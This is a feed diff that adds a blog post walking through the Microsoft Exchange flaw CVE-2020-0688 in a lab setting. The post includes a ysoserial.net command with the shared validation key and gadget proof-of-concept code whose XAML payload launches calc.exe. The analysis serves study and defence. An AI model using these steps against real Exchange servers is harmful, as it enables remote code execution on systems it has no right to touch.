@@ -3,12 +3,234 @@
     <title>Digital Self-Defense Lab</title>
     <link href="https://digital-selfdefense.net/atom.xml" rel="self"/>
     <link href="https://digital-selfdefense.net/"/>
-    <updated>2020-01-19T17:55:11+01:00</updated>
+    <updated>2020-04-11T23:33:09+02:00</updated>
     <id>https://digital-selfdefense.net</id>
     <author>
       <name></name>
       <email></email>
     </author>
+    <entry>
+      <title>Understanding CVE-2020-0688</title>
+      <link href="https://digital-selfdefense.net/2020/04/11/Understanding-CVE-2020-0688.html"/>
+      <updated>2020-04-11T12:00:00+02:00</updated>
+      <id>https://digital-selfdefense.net/2020/04/11/Understanding-CVE-2020-0688</id>
+      <content type="html">&lt;div class=&quot;message&quot;&gt;
+        Hello, Guys! In this blog post we will take an in-depth look at CVE-2020-0688 which is a recently published vulnerability in Microsoft Exchange 
+        that allows an authenticated attacker to execute arbitrary code on affected Exchange Servers.   
+        &lt;/div&gt;
+        &lt;p&gt;The first section of this blog post is meant as a short introduction to &lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2020-0688&lt;/code&gt;&lt;sup id=&quot;fnref:fn-CVE_2020_0688&quot;&gt;&lt;a href=&quot;#fn:fn-CVE_2020_0688&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; to lay the foundation for the great things 
+        in the upcoming sections. If you are already familiar with CVE-2020-0688 you can skip the first section and jump straight into the nitty gritty details of how it works.&lt;/p&gt;
+        &lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+        &lt;p&gt;On February 25th 2020 shortly after Microsoft’s Patch Tuesday, Simon Zuckerbraun from the Zero Day Initiative (ZDI&lt;sup id=&quot;fnref:fn-ZDI&quot;&gt;&lt;a href=&quot;#fn:fn-ZDI&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;) published a write-up of CVE-2020-0688 a remote code execution
+        vulnerability in Microsoft Exchange that was reported anonymously to ZDI. The anonymous researcher discovered that Microsoft Exchange uses the same cryptographic keys across all installations. This poses a serious risk for the authenticity and integrity of the view state used by the ASP.NET web application included in Microsoft Exchange.&lt;/p&gt;
+        &lt;p&gt;ASP.NET web applications like the Exchange Control Panel (ECP) make use of the view state mechanism to maintain a page state and persist data in web forms on postbacks. The view state is saved as a hidden form field (&lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt;) in the document object model (DOM) delivered by the ASP.NET server to the client (Browser). During the communication between an ASP.NET server and a client the view state is send back and forth between these two parties (NSA not included ;-)). Because HTTP is stateless it wouldn’t be possible for the ASP.NET server to reconstruct the state of web controls after postbacks if there wasn’t the view state.&lt;/p&gt;
+        &lt;p&gt;Another important aspect about the view state is that it gets deserialized on the server-side. Due to this reason it is essential that the client is unable to tamper with the view state, otherwise this would lead to remote code execution on the ASP.NET server. In order to protect the view state from tampering it’s authenticity and integrity is protected by a Keyed-Hash Message Authentication Code (HMAC) (in some cases the view state is even encrypted). In the case of Microsoft Exchange the same key is used to protect the authenticity and integrity across diffrent installations of Microsoft Exchange, which allows the attacker to forge a valid view state that will get deserialized by the server.&lt;/p&gt;
+        &lt;h2 id=&quot;exploitation-stages&quot;&gt;Exploitation Stages&lt;/h2&gt;
+        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/1.png&quot; alt=&quot;Figure 1: Exploitation Stages&quot; title=&quot;Exploitation Stages&quot; /&gt;&lt;/p&gt;
+        &lt;p&gt;In the diagram above you can see an overview of the different stages that the attacker has to go through in order to exploit CVE-2020-0688. The upcoming sections of this blog post are structured based on three stages presented here.&lt;/p&gt;
+        &lt;h2 id=&quot;lab-setup&quot;&gt;Lab Setup&lt;/h2&gt;
+        &lt;p&gt;If you are excited to play around with the public exploits available for CVE-2020-0688 and you are not currently planing to go to jail, it is necessary to setup a vulnerable Microsoft Exchange Server. The following listing shows the lab setup that was used by the author to create the blog post you are currently reading.&lt;/p&gt;
+        &lt;ol&gt;
+        &lt;li&gt;Windows Server 2012 R2&lt;/li&gt;
+        &lt;li&gt;Microsoft Exchange 2013&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/exchange/exchange-2013-prerequisites-exchange-2013-help&quot;&gt;Exchange 2013 Prerequisites&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net: .NET payload generator for deserialization&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;https://github.com/0xd4d/dnSpy&quot;&gt;dnSpy: .NET Debugger&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;/assets/uploads/2020/04/post1/files/Test.cs&quot;&gt;TextFormattingRunProperties POC&lt;/a&gt;&lt;/li&gt;
+        &lt;/ol&gt;
+        &lt;p&gt;&lt;cite&gt;DISCLAIMER: Never use the content presented on this website to break any laws! If you don’t play by the rules there won’t be any christmas presents this year.&lt;/cite&gt;&lt;/p&gt;
+        &lt;h2 id=&quot;collect&quot;&gt;Collect&lt;/h2&gt;
+        &lt;p&gt;Before you can exploit Microsoft Exchange Servers vulnerable to CVE-2020-0688 a few preconditions need to be satisfied:&lt;/p&gt;
+        &lt;ol&gt;
+        &lt;li&gt;Know the &lt;code class=&quot;highlighter-rouge&quot;&gt;validationKey&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;decryptionKey&lt;/code&gt; from the &lt;code class=&quot;highlighter-rouge&quot;&gt;web.config&lt;/code&gt; file of your target (those values are public)&lt;/li&gt;
+        &lt;li&gt;Know the ASP.NET version in use by the target (View state algorithms differ between ASP.NET versions)&lt;/li&gt;
+        &lt;li&gt;Get valid credentials to access the Exchange Control Panel (ECP) of the target&lt;/li&gt;
+        &lt;li&gt;Login to the ECP &lt;code class=&quot;highlighter-rouge&quot;&gt;/ecp/default.aspx&lt;/code&gt; and collect the ASP.NET SessionId Cookie value&lt;/li&gt;
+        &lt;li&gt;While still logged in collect the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; value from the DOM returned by requesting ECP&lt;/li&gt;
+        &lt;/ol&gt;
+        &lt;p&gt;The first point from the list is easly satisfied because the &lt;code class=&quot;highlighter-rouge&quot;&gt;validationKey&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;decryptionKey&lt;/code&gt; values are the same for all vulnerable Microsoft Exchange Servers. For the sake of completness below you can find the contents of the &lt;code class=&quot;highlighter-rouge&quot;&gt;web.config&lt;/code&gt; file used in the lab setup described in the previous section. The keys and algorithms defined in the &lt;code class=&quot;highlighter-rouge&quot;&gt;web.config&lt;/code&gt; file play an important role during the runtime of an ASP.NET web application. They are managed by an &lt;code class=&quot;highlighter-rouge&quot;&gt;MachineKeySection&lt;/code&gt; object which according to MSDN is responsible for the following tasks:&lt;/p&gt;
+        &lt;p&gt;&lt;cite&gt;“Defines the configuration settings that control the key generation and algorithms that are used in encryption, decryption, and message authentication code (MAC) operations in Windows Forms authentication, view-state validation, and session-state application isolation.”&lt;/cite&gt;.&lt;/p&gt;
+        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/2.png&quot; alt=&quot;Figure 2: web.config&quot; title=&quot;web.config&quot; /&gt;&lt;/p&gt;
+        &lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;MachineKeySection&lt;/code&gt; class provides a method called &lt;code class=&quot;highlighter-rouge&quot;&gt;GetEncodedData()&lt;/code&gt; which we will later use to forge the malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; as you we will see in the next section.&lt;/p&gt;
+        &lt;p&gt;Secondly, you need to know the ASP.NET version of the target in order to be able to forge a valid view state which gets accepted by an vulnerable Microsoft Exchange Server. This is important because the view state of ASP.NET version &amp;lt; 4.5 (legacy) and ASP.NET version &amp;gt;= 4.5 (new) are computed differently. How to get the ASP.NET version of a remote system you might ask? My answer is &lt;cite&gt;“enumerate, enumerate, enumerate, …”&lt;/cite&gt; until you find it. For my lab machine the ASP.NET version can be seen in the figure below. But please don’t hack me ;-).&lt;/p&gt;
+        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/3.png&quot; alt=&quot;Figure 3: ASP.NET Version&quot; title=&quot;ASP.NET Version&quot; /&gt;&lt;/p&gt;
+        &lt;p&gt;The third condition from the list is the hardest to satisfy, because it requires you to have valid credentials to access one of the maliboxes of the target. Keep in mind that the account used doesn’t need to have any special privileges, therefore chances are quite high that you might get lucky during your pentest journey.&lt;/p&gt;
+        &lt;p&gt;The fourth condition from our list requires you to capture the ASP.NET SessionId Cookie assigned to your user during login. This can be achived by looking at the HTTP-Headers in the network tab of the debugging tools of your browser.&lt;/p&gt;
+        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;// viewStateUserKey is normally the anti-CSRF parameter unless it is the same for all users! 
+        if (viewStateUserKey != null)
+        {
+        int count = Encoding.Unicode.GetByteCount(viewStateUserKey);
+        _macKeyBytes = new byte[count + 4];
+        Encoding.Unicode.GetBytes(viewStateUserKey, 0, viewStateUserKey.Length, _macKeyBytes, 4);
+        }
+        _macKeyBytes[0] = (byte)pageHashCode;
+        _macKeyBytes[1] = (byte)(pageHashCode &amp;gt;&amp;gt; 8);
+        _macKeyBytes[2] = (byte)(pageHashCode &amp;gt;&amp;gt; 16);
+        _macKeyBytes[3] = (byte)(pageHashCode &amp;gt;&amp;gt; 24);
+        ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+        &lt;p&gt;The value from the ASP.NET SessionId Cookie represents the &lt;code class=&quot;highlighter-rouge&quot;&gt;viewStateUserKey&lt;/code&gt; which is used as a CSRF mitigation as can be seen in the source code snippet of the view state plugin (&lt;code class=&quot;highlighter-rouge&quot;&gt;../ysoserial/Plugins/ViewStatePlugin.cs&lt;/code&gt;&lt;sup id=&quot;fnref:fn-yososerial_ViewStatePlugin&quot;&gt;&lt;a href=&quot;#fn:fn-yososerial_ViewStatePlugin&quot; class=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;). Note that the &lt;code class=&quot;highlighter-rouge&quot;&gt;viewStateUserKey&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;pageHashCode&lt;/code&gt;) are added to the &lt;code class=&quot;highlighter-rouge&quot;&gt;__macKeyBytes&lt;/code&gt; array that later on is used as input for the HMAC computation.&lt;/p&gt;
+        &lt;p&gt;Finally we need to collect the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; value from the Document Object Model (DOM) of the previously requested Exchange Control Panel (ECP). Think of the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; as a unique hash representation of the web path requested. This hash value is calculated with the help of the &lt;code class=&quot;highlighter-rouge&quot;&gt;GetNonRandomizedHashCode&lt;/code&gt; function which can be found in the &lt;code class=&quot;highlighter-rouge&quot;&gt;System.Web.Util.StringUtil&lt;/code&gt; class. The inputs for the function are the IIS path (e.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt;) and the path of the requested page (e.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;/ecp/default.aspx&lt;/code&gt;). The &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; value combined with the &lt;code class=&quot;highlighter-rouge&quot;&gt;viewStateUserKey&lt;/code&gt; described in the paragraph before are part of the HMAC computation performed while creating a view state.&lt;/p&gt;
+        &lt;p&gt;With the help of the cryptographic parameters &lt;code class=&quot;highlighter-rouge&quot;&gt;viewStateUserKey&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; the following properites are achived by the ASP.NET web application:&lt;/p&gt;
+        &lt;ul&gt;
+        &lt;li&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;viewStateUserKey&lt;/code&gt; is unique for each user session and is included in the computation of the view state HMAC. Because the &lt;code class=&quot;highlighter-rouge&quot;&gt;viewStateUserKey&lt;/code&gt; is kept secret the attacker is not able to know its value  beforehand. Therefore it is impossible for the attacker to create a web form that will trick a victim into requesting a certain action from the backend because that would require the attacker to be able to compute the view state. This provides a sufficient protection against CSRF attacks.&lt;/li&gt;
+        &lt;li&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; (part of HMAC computation) restricts the view state to the web application it originated from. Therefore it’s not possible to reply the view state of an established session to other parts of the ASP.NET web application.&lt;/li&gt;
+        &lt;/ul&gt;
+        &lt;h2 id=&quot;forge&quot;&gt;Forge&lt;/h2&gt;
+        &lt;p&gt;After collecting all necessary cryptographic parameters it’s time to forge a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; by using a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt;. According to the description found on the projects github page, &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt;&lt;sup id=&quot;fnref:fn-github_yoserialnet&quot;&gt;&lt;a href=&quot;#fn:fn-github_yoserialnet&quot; class=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; is &lt;cite&gt;“A proof-of-concept tool for generating payloads that exploit unsafe .NET object deserialization”&lt;/cite&gt;.&lt;/p&gt;
+        &lt;p&gt;The cool part about &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt; is that it contains a plugin called &lt;code class=&quot;highlighter-rouge&quot;&gt;ViewStatePlugin.cs&lt;/code&gt; that is able to generate view states for ASP.NET version &amp;lt; 4.5 (legacy) and ASP.NET version &amp;gt;= 4.5 (new). In the following you can see how we use the tool &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt; in combination with the previously collected cryptographic parameters to forge a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt;.&lt;/p&gt;
+        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;ysoserial.exe --plugin=&quot;ViewState&quot; --islegacy
+        --validationalg=&quot;SHA1&quot; 
+        --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot;
+        --viewstateuserkey=&quot;05ae4b41-51e1-4c3a-9241-6b87b169d663&quot;
+        --generator=&quot;B97B4E27&quot;
+        --gadget=&quot;TextFormattingRunProperties&quot;
+        --command=&quot;calc.exe&quot; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+        &lt;p&gt;In the first argument we specify the view state plugin which tells &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt; that we want to forge a &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt;. The second argument tells &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt; the type of &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; we want to forge. We want to generate a legacy &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; because the ASP.NET version in our lab environment is 4.0 and therefore the view state needs to be in legacy format.&lt;/p&gt;
+        &lt;p&gt;The following two arguments represent the fixed cryptographic parameters which are the root cause of CVE-2020-0688. Note that the hash algorithm used to compute the HMAC of the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;SHA1&lt;/code&gt;. This means that the integrity and authenticity of the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; is protected by a Keyed-Hash Message Authentication Code (HMAC) base on &lt;code class=&quot;highlighter-rouge&quot;&gt;SHA1&lt;/code&gt;. The key used to ensure the authenticity is the &lt;code class=&quot;highlighter-rouge&quot;&gt;ValidationKey&lt;/code&gt;. As mentioned earlier the &lt;code class=&quot;highlighter-rouge&quot;&gt;ValidationKey&lt;/code&gt; is the same for all vulnerable Microsoft Exchange Servers, which is the reason why this vulnerablity exists.&lt;/p&gt;
+        &lt;p&gt;The next two arguments are the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;ViewStateUserKey&lt;/code&gt;. Both values have been collected after logging into the ASP.NET web application (e.g. ECP) part of the vulnerable  Exchange Server. If you are not familiar with the purpouse of the two arguments I recommend you to go back to the previous section and refresh your memory. The one importat thing to remember for now is that the two arguments are part of the HMAC computation.&lt;/p&gt;
+        &lt;p&gt;Now it’s time to look into the view state plugin included in &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt;, so we are able to see exactly how a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; is generated.&lt;/p&gt;
+        &lt;p&gt;The plugin is located under &lt;code class=&quot;highlighter-rouge&quot;&gt;/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs&lt;/code&gt;.&lt;/p&gt;
+        &lt;p&gt;If you browse through &lt;code class=&quot;highlighter-rouge&quot;&gt;ViewStatePlugin.cs&lt;/code&gt; you will notice that the function responsible for generating the malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; is the one called &lt;code class=&quot;highlighter-rouge&quot;&gt;generateViewStateLegacy_2_to_4()&lt;/code&gt;. In the code listing below you can see a number of functions that are called from &lt;code class=&quot;highlighter-rouge&quot;&gt;generateViewStateLegacy_2_to_4()&lt;/code&gt; to generate the malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt;.&lt;/p&gt;
+        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;generateViewStateLegacy_2_to_4()
+        |
+        +-&amp;gt; MachineKeySection.GetEncodedData()
+        |
+        +-&amp;gt; MachineKeySection.HashData()
+        |
+        +-&amp;gt; MachineKeySection.GetHMACSHA1Hash()
+        |
+        +-&amp;gt; UnsafeNativeMethods.GetHMACSHA1Hash()	&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+        &lt;p&gt;The first thing you see when looking at some of the functions called by &lt;code class=&quot;highlighter-rouge&quot;&gt;generateViewStateLegacy_2_to_4()&lt;/code&gt; is that they clearly have something to do with the HMAC computation. Another important detail to notice is that the functions are from the &lt;code class=&quot;highlighter-rouge&quot;&gt;MachineKeySection&lt;/code&gt;&lt;sup id=&quot;fnref:fn-microsoft_MachineKeySection&quot;&gt;&lt;a href=&quot;#fn:fn-microsoft_MachineKeySection&quot; class=&quot;footnote&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; class which according to MSDN is responsible for handling view-state validation, &lt;cite&gt;“Defines the configuration settings that control the key generation and algorithms that are used in encryption, decryption, and message authentication code (MAC) operations in Windows Forms authentication, view-state validation, and session-state application isolation.”&lt;/cite&gt;.&lt;/p&gt;
+        &lt;p&gt;The malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; is nothing more than a serialized and base64 encoded &lt;code class=&quot;highlighter-rouge&quot;&gt;Gadget&lt;/code&gt; (we will come back to this later) combined with an HMAC computed from the &lt;code class=&quot;highlighter-rouge&quot;&gt;Gadget&lt;/code&gt; itself and the cryptographic parameters collected in the first stage of our attack.&lt;/p&gt;
+        &lt;p&gt;The diagram below should help you to understand how the HMAC is generated by &lt;code class=&quot;highlighter-rouge&quot;&gt;generateViewStateLegacy_2_to_4()&lt;/code&gt; based on the &lt;code class=&quot;highlighter-rouge&quot;&gt;Gadget&lt;/code&gt; and the cryptographic parameters provided to the function.&lt;/p&gt;
+        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/4.png&quot; alt=&quot;Figure 4: SHA1 HMAC&quot; title=&quot;SHA1 HMAC&quot; /&gt;&lt;/p&gt;
+        &lt;p&gt;Finally the HMAC above is appended to the serialized and base64 encoded &lt;code class=&quot;highlighter-rouge&quot;&gt;Gadget&lt;/code&gt; which represents the malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; as shown in the following diagram.&lt;/p&gt;
+        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/5.png&quot; alt=&quot;Figure 5: Malicious __VIEWSTATE&quot; title=&quot;Malicious __VIEWSTATE&quot; /&gt;&lt;/p&gt;
+        &lt;p&gt;At this point you might have noticed that there are still two arguments left from the &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt; commandline that need some explanation. Those two arguments will be covered in greater detail the upcoming section.&lt;/p&gt;
+        &lt;h2 id=&quot;smash&quot;&gt;Smash&lt;/h2&gt;
+        &lt;p&gt;In the previous section we introduced the vast majority of arguments required by the tool &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt; to forge a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; with the exception of the two arguments &lt;code class=&quot;highlighter-rouge&quot;&gt;gadget&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;command&lt;/code&gt;. These two arguments are responsible for providing a means of code execution as we will see in the following paragraphs.&lt;/p&gt;
+        &lt;p&gt;Before we continue let’s remember that our final goal is to execute code on the vulnerable Microsoft Exchange Server, which requires us to send the server a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; that, when deserialized on the server-side leads to code execution.&lt;/p&gt;
+        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;ysoserial.exe ...
+        --gadget=&quot;TextFormattingRunProperties&quot;
+        --command=&quot;calc.exe&quot; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+        &lt;p&gt;The last argument from the above commandline which is named &lt;code class=&quot;highlighter-rouge&quot;&gt;command&lt;/code&gt;, is responsible for what gets executed when our malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; is deserialized by the server-side. For demonstration purpouses &lt;code class=&quot;highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt; is used as our final payload but in general the value is only limited by the imagination of the attacker.&lt;/p&gt;
+        &lt;p&gt;But what about this mysterious argument named &lt;code class=&quot;highlighter-rouge&quot;&gt;gadget&lt;/code&gt; which has &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; as its value? As you might have guessed by now the actual magic lies in the class called &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt;.&lt;/p&gt;
+        &lt;p&gt;Classes like &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; are regular building blocks of the .NET-Framework with the exception that they provide an indirect (often not intended) way of enabling code execution during deserialization.&lt;/p&gt;
+        &lt;p&gt;When deserializing an serialized object of the type &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; a chain of methods is called on its properties which finally leads to code execution. In technical terms this is often referred to as &lt;code class=&quot;highlighter-rouge&quot;&gt;Gadget chain&lt;/code&gt;. Now let’s take a look at how this gadget can help us in achieving code execution on our Microsoft Exchange Server.&lt;/p&gt;
+        &lt;p&gt;To demonstrate to you what happens when an object of type &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; gets deserialized we will take a look at a proof-of-concept code borrowed from the finders of the gadget Alvaro Muñoz and Oleksandr Mirosh&lt;sup id=&quot;fnref:fn-New_Gadget&quot;&gt;&lt;a href=&quot;#fn:fn-New_Gadget&quot; class=&quot;footnote&quot;&gt;6&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+        &lt;p&gt;The class below implements the interface &lt;code class=&quot;highlighter-rouge&quot;&gt;ISerializable&lt;/code&gt; which tells us that objects of this type will use a custom way of serialization. When serialzing an object the &lt;code class=&quot;highlighter-rouge&quot;&gt;GetObjectData&lt;/code&gt; method is called implcitly. Inside this method we specify the property &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt; as part of the &lt;code class=&quot;highlighter-rouge&quot;&gt;SerializationInfo&lt;/code&gt; object. According to MSDN the &lt;code class=&quot;highlighter-rouge&quot;&gt;SerializationInfo&lt;/code&gt; class is responsible for the storage of all the data that is needed to serialize or deserialize an object. Also note that the type of &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt; is defined as &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; and that it uses the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;_xaml&lt;/code&gt; as its value.&lt;/p&gt;
+        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[Serializable]
+        public class TextFormattingRunPropertiesMarshal : ISerializable
+        {
+        string _xaml;
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+        Type t = Type.GetType(&quot;Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, 
+        Microsoft.PowerShell.Editor, 
+        Version=3.0.0.0, 
+        Culture=neutral, 
+        PublicKeyToken=31bf3856ad364e35&quot;);
+        info.SetType(t);
+        info.AddValue(&quot;ForegroundBrush&quot;, _xaml);
+        }
+        public TextFormattingRunPropertiesMarshal(string xaml)
+        {
+        _xaml = xaml;
+        }
+        }	&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+        &lt;p&gt;The complete source code of this example can be found &lt;a href=&quot;/assets/uploads/2020/04/post1/files/Test.cs&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+        &lt;p&gt;Before we are able to execute arbitrary commands with the help of the class presented above we first need to define the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;payload&lt;/code&gt; of type &lt;code class=&quot;highlighter-rouge&quot;&gt;string&lt;/code&gt; which will contain the following XAML. If this doesn’t make any sense to you right now don’t worry we will shortly provide you with an detailed explanation of whats going on here.&lt;/p&gt;
+        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;
+        xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;
+        xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot;
+        xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&amp;gt;
+        &amp;lt;ObjectDataProvider x:Key=&quot;RunCalc&quot; ObjectType = &quot;{ x:Type Diag:Process }&quot; MethodName = &quot;Start&quot;&amp;gt;
+        &amp;lt;ObjectDataProvider.MethodParameters&amp;gt;
+        &amp;lt;System:String&amp;gt;cmd&amp;lt;/System:String&amp;gt;
+        &amp;lt;System:String&amp;gt;/c calc.exe &amp;lt;/System:String&amp;gt;
+        &amp;lt;/ObjectDataProvider.MethodParameters&amp;gt;
+        &amp;lt;/ObjectDataProvider&amp;gt;
+        &amp;lt;/ResourceDictionary&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+        &lt;p&gt;What follows next is that we create an object of type &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunPropertiesMarshal&lt;/code&gt; and provide its constructor the previously defined &lt;code class=&quot;highlighter-rouge&quot;&gt;payload&lt;/code&gt; variable which contains the XAML specified above. In the subsequent lines we see how the object is first serialized and then deserialized immediately. For the purpouse of serialization/deserialization we use the class &lt;code class=&quot;highlighter-rouge&quot;&gt;LosFormatter&lt;/code&gt;&lt;sup id=&quot;fnref:fn-microsoft_LosFormatter&quot;&gt;&lt;a href=&quot;#fn:fn-microsoft_LosFormatter&quot; class=&quot;footnote&quot;&gt;7&lt;/a&gt;&lt;/sup&gt;. This class is used by ASP.NET web applications to serialize/deserialize the view state.&lt;/p&gt;
+        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Object obj = new TextFormattingRunPropertiesMarshal(payload);
+        LosFormatter fmt = new LosFormatter();
+        MemoryStream ms = new MemoryStream();
+        fmt.Serialize(ms, obj);
+        ms.Position = 0;
+        fmt.Deserialize(ms);&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+        &lt;p&gt;When you compile and execute the binary from this c-sharp proof-of-conecept code (POC) a calculator will somehow magically appear as can be seen in the following figure.&lt;/p&gt;
+        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/6.png&quot; alt=&quot;Figure 6: TextFormattingRunProperties Gadget&quot; title=&quot;TextFormattingRunProperties Gadget&quot; /&gt;&lt;/p&gt;
